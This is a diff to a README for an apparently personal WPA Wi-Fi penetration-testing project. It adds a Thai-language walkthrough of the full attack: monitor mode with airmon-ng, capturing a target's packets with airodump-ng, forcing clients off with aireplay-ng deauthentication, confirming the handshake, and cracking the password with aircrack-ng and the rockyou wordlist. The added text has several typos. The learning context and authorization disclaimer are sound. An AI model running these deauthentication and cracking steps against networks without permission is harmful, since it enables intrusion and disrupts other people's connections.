@@ -40,3 +40,23 @@ A hands-on penetration testing project to evaluate the security of a personal WP
 ## Disclosure
 
 This project is intended for learning wireless security concepts. Always test only on networks and devices you own or have explicit authorization to assess.
+
+
+
+สแกนหา AP เป้าหมายก่อน
+รัน sudo airodump-ng wlan1mon --band a (หรือเปล่าเปล่าเข้ามาก่อนเปิด monitor mode) เพื่อส่องหาเป้าหมาย จจำ BSSID, channel (CH), และ ESSID ของเป้าหมายที่จะเจาะไว้ใช้ต่อ
+
+เปิด monitor mode
+รัน sudo airmon-ng check kill (ปิด process ที่จะมาแซง monitor mode) แล้ว sudo airmon-ng start wlan1 เสร็จแล้วเช็คด้วย iwconfig ควรเห็น interface ชื่อ wlan1mon โหมดขึ้นเป็น Mode:Monitor แล้ว (ไม่ใช่ wlan0/wlan0mon)
+
+ล็อกเป้าด้วย airodump-ng
+รัน sudo airodump-ng -c <channel จากข้อ 1> --bssid <BSSID เป้าหมาย> -w capture wlan1mon แล้วปล่อยค้างไว้ (อย่าปิด) เพื่อดักฟังและบันทึกแพ็กเก็ตที่เกี่ยวข้องกับ AP นี้ลงไฟล์ capture-01.cap เป้าหมายจะหลุดออกทันทีหลังที่เจอ
+
+ยิง deauth บังคับ reconnect
+เปิดหน้าต่างใหม่ รัน sudo aireplay-ng -0 2 -a <BSSID> -c <client MAC จากตารัง STATION ในหน้าต่างก่อน> wlan1mon เพื่อปลอม deauth เตะ client ออกจาก AP ชั่วครู่ ให้ client reconnect เองอัตโนมัติ
+
+เช็คยืนยันว่าจับ handshake ได้จรง
+กลับไปดูหน้าต่าง airodump-ng ควรเห็นข้อความ 'WPA handshake: <BSSID>' ขึ้นที่มุมขวาบน และตาราง STATION มีคอละมน์ EAPOL ขึ้นเป็นหลักฐานว่าจับ handshake โดยสมบูรณ์จำเป็นก่อนจะกด Ctrl+C หยุด capture
+
+Crack ด้วย aircrack-ng
+รัน aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt ไล้ทดเดารหัสจากลิสต์เทียบ MIC จนกว่าจะเจอคำที่ตรง (ถ้าเจอ error ว่า ESSID is required เพราะไม่มี beacon frame ติดมา ให้เตีม -e <ชื่อ WiFi> ท้ายคำสั่ง)
